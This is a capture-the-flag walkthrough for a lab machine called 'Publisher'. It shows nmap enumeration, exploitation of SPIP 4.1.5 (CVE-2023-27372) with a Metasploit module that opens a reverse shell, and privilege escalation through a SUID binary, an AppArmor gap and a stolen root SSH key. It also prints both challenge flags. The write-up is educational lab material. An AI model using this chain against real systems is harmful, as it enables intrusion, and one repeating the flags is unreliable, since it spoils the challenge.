# Publisher

## Intro

The "Publisher" CTF machine is a simulated environment hosting some services.
Through enumeration techniques like directory fuzzing and version identification, a vulnerability is discovered that allows for **Remote Code Execution (RCE)**.

Privilege escalation is then attempted using a custom binary, but access restrictions from AppArmor limit system interaction. With deeper exploration, we find a loophole that enables execution of an unconfined bash shell and full root access.

Hints from the intro suggest:

1. Enumerate for a website.
2. Identify the version in use.
3. Exploit the version using RCE.
4. Escalate privileges to get the final flag.

---

## Nmap

Command used:

```bash
nmap -sC -sV -p- TARGET
```

Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
```

---

## Website Enumeration

Visiting the site on port 80:

<img width="1854" height="1048" alt="Screenshot From 2025-08-26 14-46-15" src="https://github.com/user-attachments/assets/b08dc577-e24a-495d-9a89-176fceb544b6" />

Looking further, we find a **blog page**:

<img width="181" height="265" alt="Screenshot From 2025-08-26 14-56-34" src="https://github.com/user-attachments/assets/2410dfe8-b12b-4be5-96f8-f450189eeab0" />

Clicking into it:

<img width="1854" height="1048" alt="Screenshot From 2025-08-26 15-01-47" src="https://github.com/user-attachments/assets/80437516-320e-4567-97e0-d1fde8d57173" />

This reveals everything needed about the vulnerable version.

---

## Exploitation (SPIP RCE)

The CMS in use is **SPIP 4.1.5**, which is vulnerable to RCE.
Reference: [CVE-2023-27372 GitHub PoC](https://github.com/nuts7/CVE-2023-27372).

Using Metasploit:

```bash
msfconsole
search spip
use exploit/multi/http/spip_rce_form
set RHOST <target-ip>
set LHOST <your-ip>
set TARGETURI /spip
run
```

<img width="1620" height="465" alt="Screenshot From 2025-08-26 15-19-00" src="https://github.com/user-attachments/assets/b0fed0b5-e459-4702-86b8-8b5ba784a4a9" />

After executing, we gain a shell and capture the first flag.

> Q1: User flag
> A1: fa229046d44eda6a3598c73ad96f4ca5

---

## Privilege Escalation

We get a hint: *“Look to the AppArmor by its profile.”*

Checking SSH, we find a private key file that works:

<img width="1854" height="1048" alt="Screenshot From 2025-08-26 15-43-32" src="https://github.com/user-attachments/assets/ef223e9f-be3e-49d3-b285-c02e2d0d8d11" />
<img width="1099" height="376" alt="Screenshot From 2025-08-26 15-53-25" src="https://github.com/user-attachments/assets/794d8762-b59b-40d9-a0ef-a1bdc76dbd0a" />

Login:

```bash
chmod 600 keyfile
ssh -i keyfile think@<target-ip>
```

---

### SUID Binary Discovery

We find a custom SUID binary:

```
524324     20 -rwsr-sr-x   1 root root 16760 Nov 14  2023 /usr/sbin/run_container
```

This binary executes `/opt/run_container.sh` with root privileges.

Attempts to run commands are restricted by AppArmor rules.

---

### AppArmor Analysis

* Rules block access to `/opt/` and restrict `/usr/bin` and `/usr/sbin`.
* But `/dev/shm/` and `/var/tmp/` do not have complete deny rules.
* This allows execution of a **bash shell** outside restricted directories.

---

### Privilege Escalation Walkthrough

1. **Enumerate SUID binary** (`/usr/sbin/run_container`).
2. Confirm it runs `/opt/run_container.sh` as root.
3. Modify `run_container.sh` to execute commands.
4. List `/root` directory → found `.ssh`.
5. Dump root’s private key.
6. Save as `root_id_rsa` and set permissions:

   ```bash
   chmod 600 root_id_rsa
   ssh -i root_id_rsa root@<target-ip>
   ```
7. Login as root and grab the final flag.

---

## Flags

> Q1: User flag
> A1: fa229046d44eda6a3598c73ad96f4ca5

> Q2: Root flag
> A2: 3a4225cc9e85709adda6ef55d6a4f2ca

---

## Conclusion

* Enumerated services and identified the SPIP CMS.
* Exploited CVE-2023-27372 for RCE via Metasploit.
* Found SUID binary and exploited weak AppArmor restrictions.
* Extracted root’s private key and logged in as root.
* Captured both user and root flags.

---
